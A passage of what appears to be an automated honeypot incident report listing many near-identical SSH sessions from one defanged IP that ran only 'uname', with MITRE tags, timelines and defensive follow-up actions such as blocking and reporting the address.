| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:59:55` | `cowrie.session.connect` |
| `2026-07-04 18:59:55` | `cowrie.client.version` |
| `2026-07-04 18:59:55` | `cowrie.client.kex` |
| `2026-07-04 18:59:55` | `cowrie.login.success` |
| `2026-07-04 18:59:56` | `cowrie.session.params` |
| `2026-07-04 18:59:56` | `cowrie.command.input` |
| `2026-07-04 18:59:56` | `cowrie.log.closed` |
| `2026-07-04 18:59:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5940f4561d58

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:00 |
| **Last Seen** | 2026-07-04 19:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:00:00` | `cowrie.session.connect` |
| `2026-07-04 19:00:00` | `cowrie.client.version` |
| `2026-07-04 19:00:00` | `cowrie.client.kex` |
| `2026-07-04 19:00:01` | `cowrie.login.success` |
| `2026-07-04 19:00:02` | `cowrie.session.params` |
| `2026-07-04 19:00:02` | `cowrie.command.input` |
| `2026-07-04 19:00:02` | `cowrie.log.closed` |
| `2026-07-04 19:00:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a3adab6eb3c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:00 |
| **Last Seen** | 2026-07-04 19:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:00:06` | `cowrie.session.connect` |
| `2026-07-04 19:00:06` | `cowrie.client.version` |
| `2026-07-04 19:00:06` | `cowrie.client.kex` |
| `2026-07-04 19:00:07` | `cowrie.login.success` |
| `2026-07-04 19:00:08` | `cowrie.session.params` |
| `2026-07-04 19:00:08` | `cowrie.command.input` |
| `2026-07-04 19:00:08` | `cowrie.log.closed` |
| `2026-07-04 19:00:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b44facaf8185

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:00 |
| **Last Seen** | 2026-07-04 19:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:00:11` | `cowrie.session.connect` |
| `2026-07-04 19:00:11` | `cowrie.client.version` |
| `2026-07-04 19:00:12` | `cowrie.client.kex` |
| `2026-07-04 19:00:12` | `cowrie.login.success` |
| `2026-07-04 19:00:13` | `cowrie.session.params` |
| `2026-07-04 19:00:13` | `cowrie.command.input` |
| `2026-07-04 19:00:13` | `cowrie.log.closed` |
| `2026-07-04 19:00:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13b8e3381bef

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:00 |
| **Last Seen** | 2026-07-04 19:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:00:18` | `cowrie.session.connect` |
| `2026-07-04 19:00:18` | `cowrie.client.version` |
| `2026-07-04 19:00:18` | `cowrie.client.kex` |
| `2026-07-04 19:00:18` | `cowrie.login.success` |
| `2026-07-04 19:00:19` | `cowrie.session.params` |
| `2026-07-04 19:00:19` | `cowrie.command.input` |
| `2026-07-04 19:00:19` | `cowrie.log.closed` |
| `2026-07-04 19:00:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f731b0a3f6e5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:00 |
| **Last Seen** | 2026-07-04 19:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:00:23` | `cowrie.session.connect` |
| `2026-07-04 19:00:24` | `cowrie.client.version` |
| `2026-07-04 19:00:24` | `cowrie.client.kex` |
| `2026-07-04 19:00:24` | `cowrie.login.success` |
| `2026-07-04 19:00:25` | `cowrie.session.params` |
| `2026-07-04 19:00:25` | `cowrie.command.input` |
| `2026-07-04 19:00:25` | `cowrie.log.closed` |
| `2026-07-04 19:00:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44031d8c2b4a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:00 |
| **Last Seen** | 2026-07-04 19:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:00:29` | `cowrie.session.connect` |
| `2026-07-04 19:00:29` | `cowrie.client.version` |
| `2026-07-04 19:00:29` | `cowrie.client.kex` |
| `2026-07-04 19:00:30` | `cowrie.login.success` |
| `2026-07-04 19:00:31` | `cowrie.session.params` |
| `2026-07-04 19:00:31` | `cowrie.command.input` |
| `2026-07-04 19:00:31` | `cowrie.log.closed` |
| `2026-07-04 19:00:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a3a6c1c091e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:00 |
| **Last Seen** | 2026-07-04 19:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:00:35` | `cowrie.session.connect` |
| `2026-07-04 19:00:35` | `cowrie.client.version` |
| `2026-07-04 19:00:35` | `cowrie.client.kex` |
| `2026-07-04 19:00:35` | `cowrie.login.success` |
| `2026-07-04 19:00:36` | `cowrie.session.params` |
| `2026-07-04 19:00:36` | `cowrie.command.input` |
| `2026-07-04 19:00:37` | `cowrie.log.closed` |
| `2026-07-04 19:00:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96938df7bff5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:00 |
| **Last Seen** | 2026-07-04 19:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:00:40` | `cowrie.session.connect` |
| `2026-07-04 19:00:40` | `cowrie.client.version` |
| `2026-07-04 19:00:41` | `cowrie.client.kex` |
| `2026-07-04 19:00:41` | `cowrie.login.success` |
| `2026-07-04 19:00:42` | `cowrie.session.params` |
| `2026-07-04 19:00:42` | `cowrie.command.input` |
| `2026-07-04 19:00:42` | `cowrie.log.closed` |
| `2026-07-04 19:00:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e68b827f741

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:00 |
| **Last Seen** | 2026-07-04 19:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:00:46` | `cowrie.session.connect` |
| `2026-07-04 19:00:46` | `cowrie.client.version` |
| `2026-07-04 19:00:46` | `cowrie.client.kex` |
| `2026-07-04 19:00:47` | `cowrie.login.success` |
| `2026-07-04 19:00:48` | `cowrie.session.params` |
| `2026-07-04 19:00:48` | `cowrie.command.input` |
| `2026-07-04 19:00:48` | `cowrie.log.closed` |
| `2026-07-04 19:00:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-773131bf99fa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:00 |
| **Last Seen** | 2026-07-04 19:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:00:52` | `cowrie.session.connect` |
| `2026-07-04 19:00:52` | `cowrie.client.version` |
| `2026-07-04 19:00:52` | `cowrie.client.kex` |
| `2026-07-04 19:00:52` | `cowrie.login.success` |
| `2026-07-04 19:00:53` | `cowrie.session.params` |
| `2026-07-04 19:00:53` | `cowrie.command.input` |
| `2026-07-04 19:00:53` | `cowrie.log.closed` |
| `2026-07-04 19:00:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-050ca33f21a9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:00 |
| **Last Seen** | 2026-07-04 19:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:00:57` | `cowrie.session.connect` |
| `2026-07-04 19:00:57` | `cowrie.client.version` |
| `2026-07-04 19:00:57` | `cowrie.client.kex` |
| `2026-07-04 19:00:58` | `cowrie.login.success` |
| `2026-07-04 19:00:59` | `cowrie.session.params` |
| `2026-07-04 19:00:59` | `cowrie.command.input` |
| `2026-07-04 19:00:59` | `cowrie.log.closed` |
| `2026-07-04 19:00:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6650071cbdeb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:01 |
| **Last Seen** | 2026-07-04 19:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:01:03` | `cowrie.session.connect` |
| `2026-07-04 19:01:03` | `cowrie.client.version` |
| `2026-07-04 19:01:03` | `cowrie.client.kex` |
| `2026-07-04 19:01:03` | `cowrie.login.success` |
| `2026-07-04 19:01:04` | `cowrie.session.params` |
| `2026-07-04 19:01:04` | `cowrie.command.input` |
| `2026-07-04 19:01:04` | `cowrie.log.closed` |
| `2026-07-04 19:01:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72350d462bac

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:01 |
| **Last Seen** | 2026-07-04 19:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:01:08` | `cowrie.session.connect` |
| `2026-07-04 19:01:08` | `cowrie.client.version` |
| `2026-07-04 19:01:08` | `cowrie.client.kex` |
| `2026-07-04 19:01:09` | `cowrie.login.success` |
| `2026-07-04 19:01:10` | `cowrie.session.params` |
| `2026-07-04 19:01:10` | `cowrie.command.input` |
| `2026-07-04 19:01:10` | `cowrie.log.closed` |
| `2026-07-04 19:01:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d68da0cdce8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:01 |
| **Last Seen** | 2026-07-04 19:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:01:14` | `cowrie.session.connect` |
| `2026-07-04 19:01:14` | `cowrie.client.version` |
| `2026-07-04 19:01:14` | `cowrie.client.kex` |
| `2026-07-04 19:01:14` | `cowrie.login.success` |
| `2026-07-04 19:01:15` | `cowrie.session.params` |
| `2026-07-04 19:01:15` | `cowrie.command.input` |
| `2026-07-04 19:01:15` | `cowrie.log.closed` |
| `2026-07-04 19:01:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-372860b8273c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:01 |
| **Last Seen** | 2026-07-04 19:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:01:19` | `cowrie.session.connect` |
| `2026-07-04 19:01:19` | `cowrie.client.version` |
| `2026-07-04 19:01:19` | `cowrie.client.kex` |
| `2026-07-04 19:01:20` | `cowrie.login.success` |
| `2026-07-04 19:01:21` | `cowrie.session.params` |
| `2026-07-04 19:01:21` | `cowrie.command.input` |
| `2026-07-04 19:01:21` | `cowrie.log.closed` |
| `2026-07-04 19:01:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f5bd2a6b789

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:01 |
| **Last Seen** | 2026-07-04 19:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:01:25` | `cowrie.session.connect` |
| `2026-07-04 19:01:25` | `cowrie.client.version` |
| `2026-07-04 19:01:25` | `cowrie.client.kex` |
| `2026-07-04 19:01:25` | `cowrie.login.success` |
| `2026-07-04 19:01:26` | `cowrie.session.params` |
| `2026-07-04 19:01:26` | `cowrie.command.input` |
| `2026-07-04 19:01:26` | `cowrie.log.closed` |
| `2026-07-04 19:01:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69f260ee5829

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:01 |
| **Last Seen** | 2026-07-04 19:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:01:30` | `cowrie.session.connect` |
| `2026-07-04 19:01:30` | `cowrie.client.version` |
| `2026-07-04 19:01:30` | `cowrie.client.kex` |
| `2026-07-04 19:01:31` | `cowrie.login.success` |
| `2026-07-04 19:01:32` | `cowrie.session.params` |
| `2026-07-04 19:01:32` | `cowrie.command.input` |
| `2026-07-04 19:01:32` | `cowrie.log.closed` |
| `2026-07-04 19:01:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d47e5793f1fb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:01 |
| **Last Seen** | 2026-07-04 19:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:01:35` | `cowrie.session.connect` |
| `2026-07-04 19:01:35` | `cowrie.client.version` |
| `2026-07-04 19:01:35` | `cowrie.client.kex` |
| `2026-07-04 19:01:36` | `cowrie.login.success` |
| `2026-07-04 19:01:37` | `cowrie.session.params` |
| `2026-07-04 19:01:37` | `cowrie.command.input` |
| `2026-07-04 19:01:37` | `cowrie.log.closed` |
| `2026-07-04 19:01:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9e86cd0d07d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:01 |
| **Last Seen** | 2026-07-04 19:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:01:41` | `cowrie.session.connect` |
| `2026-07-04 19:01:41` | `cowrie.client.version` |
| `2026-07-04 19:01:41` | `cowrie.client.kex` |
| `2026-07-04 19:01:42` | `cowrie.login.success` |
| `2026-07-04 19:01:42` | `cowrie.session.params` |
| `2026-07-04 19:01:42` | `cowrie.command.input` |
| `2026-07-04 19:01:43` | `cowrie.log.closed` |
| `2026-07-04 19:01:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3fef3e3a9b1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:01 |
| **Last Seen** | 2026-07-04 19:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:01:47` | `cowrie.session.connect` |
| `2026-07-04 19:01:47` | `cowrie.client.version` |
| `2026-07-04 19:01:47` | `cowrie.client.kex` |
| `2026-07-04 19:01:48` | `cowrie.login.success` |
| `2026-07-04 19:01:49` | `cowrie.session.params` |
| `2026-07-04 19:01:49` | `cowrie.command.input` |
| `2026-07-04 19:01:49` | `cowrie.log.closed` |
| `2026-07-04 19:01:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89dacf06e73a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:01 |
| **Last Seen** | 2026-07-04 19:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:01:52` | `cowrie.session.connect` |
| `2026-07-04 19:01:52` | `cowrie.client.version` |
| `2026-07-04 19:01:52` | `cowrie.client.kex` |
| `2026-07-04 19:01:52` | `cowrie.login.success` |
| `2026-07-04 19:01:54` | `cowrie.session.params` |
| `2026-07-04 19:01:54` | `cowrie.command.input` |
| `2026-07-04 19:01:54` | `cowrie.log.closed` |
| `2026-07-04 19:01:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8adabdad9159

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:01 |
| **Last Seen** | 2026-07-04 19:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:01:57` | `cowrie.session.connect` |
| `2026-07-04 19:01:58` | `cowrie.client.version` |
| `2026-07-04 19:01:58` | `cowrie.client.kex` |
| `2026-07-04 19:01:58` | `cowrie.login.success` |
| `2026-07-04 19:01:59` | `cowrie.session.params` |
| `2026-07-04 19:01:59` | `cowrie.command.input` |
| `2026-07-04 19:01:59` | `cowrie.log.closed` |
| `2026-07-04 19:01:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bff1d76d878

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:02 |
| **Last Seen** | 2026-07-04 19:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:02:03` | `cowrie.session.connect` |
| `2026-07-04 19:02:03` | `cowrie.client.version` |
| `2026-07-04 19:02:03` | `cowrie.client.kex` |
| `2026-07-04 19:02:04` | `cowrie.login.success` |
| `2026-07-04 19:02:05` | `cowrie.session.params` |
| `2026-07-04 19:02:05` | `cowrie.command.input` |
| `2026-07-04 19:02:05` | `cowrie.log.closed` |
| `2026-07-04 19:02:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12aa9402f905

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:02 |
| **Last Seen** | 2026-07-04 19:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:02:08` | `cowrie.session.connect` |
| `2026-07-04 19:02:08` | `cowrie.client.version` |
| `2026-07-04 19:02:09` | `cowrie.client.kex` |
| `2026-07-04 19:02:10` | `cowrie.login.success` |
| `2026-07-04 19:02:11` | `cowrie.session.params` |
| `2026-07-04 19:02:11` | `cowrie.command.input` |
| `2026-07-04 19:02:11` | `cowrie.log.closed` |
| `2026-07-04 19:02:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-477b59435936

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:02 |
| **Last Seen** | 2026-07-04 19:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:02:14` | `cowrie.session.connect` |
| `2026-07-04 19:02:14` | `cowrie.client.version` |
| `2026-07-04 19:02:14` | `cowrie.client.kex` |
| `2026-07-04 19:02:15` | `cowrie.login.success` |
| `2026-07-04 19:02:16` | `cowrie.session.params` |
| `2026-07-04 19:02:16` | `cowrie.command.input` |
| `2026-07-04 19:02:16` | `cowrie.log.closed` |
| `2026-07-04 19:02:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
